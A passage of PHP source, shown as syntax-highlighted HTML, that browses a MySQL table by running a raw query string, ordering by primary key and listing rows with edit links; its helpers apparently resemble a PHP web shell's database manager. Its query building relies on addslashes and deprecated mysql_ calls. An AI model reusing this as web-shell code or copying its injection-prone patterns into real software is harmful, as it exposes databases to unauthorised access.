<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   preg_match_all("/from\s+`{0,1}([\w]+)`{0<span style="text-decoration: underline;">,1}\s+/i",$sql_line,$matches);</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $tablename = $matches[1][0];
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }

<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   /*********************/
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $getfield = q("SHOW COLUMNS FROM $tablename"<span style="text-decoration: underline;">);</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $rowdb = array();
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $keyfied = ''; //&#20027;&#38190;&#23383;&#27573;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   while($row = @mysql_fetch_assoc($getfield)) <span style="text-decoration: underline;">{</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $rowdb[$row['Field']]['Key'] = $row['Key<span style="text-decoration: underline;">'];</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $rowdb[$row['Field']]['Extra'] = $row['E<span style="text-decoration: underline;">xtra'];</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($row['Key'] == 'UNI' || $row['Key'] <span style="text-decoration: underline;">== 'PRI') {</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $keyfied = $row['Field'];
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   /*********************/<span style="color: #de935f; background-color: #373b41;">                     </span><span style="color: #de935f; background-color: #373b41; text-decoration: underline;">            </span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   //&#30452;&#25509;&#27983;&#35272;&#34920;&#25353;&#29031;&#20027;&#38190;&#38477;&#24207;&#25490;&#21015;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($keyfied &amp;&amp; strtolower(substr($query,0,1<span style="text-decoration: underline;">3)) == 'select * from') {</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $query = str_replace(" LIMIT ", " order <span style="text-decoration: underline;">by $keyfied DESC LIMIT ", $query);</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }

<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $result = q($query);

<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p($multipage);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;table border="0" cellpadding="3" cellspa<span style="text-decoration: underline;">cing="0"&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;tr class="head"&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($allowedit) p('&lt;td&gt;Action&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $fieldnum = @mysql_num_fields($result);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   for($i=0;$i&lt;$fieldnum;$i++){
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $name = @mysql_field_name($result, $i);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $type = @mysql_field_type($result, $i);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $len = @mysql_field_len($result, $i);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p("&lt;td nowrap&gt;$name&lt;br&gt;&lt;span&gt;$type($len)<span style="text-decoration: underline;">".(($rowdb[$name]['Key'] == 'UNI' || $rowdb[$name]['Key'] == 'PRI') ? '&lt;b&gt; - PRIMARY&lt;/b&gt;' : '').($rowdb[$name]['Extra'] == 'auto_increment' ? '&lt;b&gt; - Auto&lt;/b&gt;' : '')."&lt;/span&gt;&lt;/td&gt;");</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;/tr&gt;');

<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   while($mn = @mysql_fetch_assoc($result)){
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $thisbg = bg();
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;tr class="'.$thisbg.'" onmouseover="<span style="text-decoration: underline;">this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';"&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $where = $tmp = $b1 = '';
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   //&#36873;&#21462;&#26465;&#20214;&#23383;&#27573;&#29992;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   foreach($mn as $key=&gt;$inside){
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($inside) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   //&#26597;&#25214;&#20027;&#38190;&#12289;&#21807;&#19968;&#23646;&#24615;&#12289;&#33258;&#21160;&#22686;&#21152;&#30340;&#23383;&#27573;&#65292;&#25214;&#21040;&#23601;&#20572;&#27490;&#65292;&#21542;&#21017;&#32452;&#21512;&#25152;&#26377;<span style="text-decoration: underline;">&#23383;&#27573;&#20316;&#20026;&#26465;&#20214;&#12290;</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($rowdb[$key]['Key'] == 'UNI'<span style="text-decoration: underline;"> || $rowdb[$key]['Extra'] == 'auto_increment' || $rowdb[$key]['Key'] == 'PRI') {</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $where = $key."='".addslashe<span style="text-decoration: underline;">s($inside)."'";</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   break;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $where .= $tmp.$key."='".addslas<span style="text-decoration: underline;">hes($inside)."'";</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $tmp = ' AND ';
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   //&#35835;&#21462;&#35760;&#24405;&#29992;
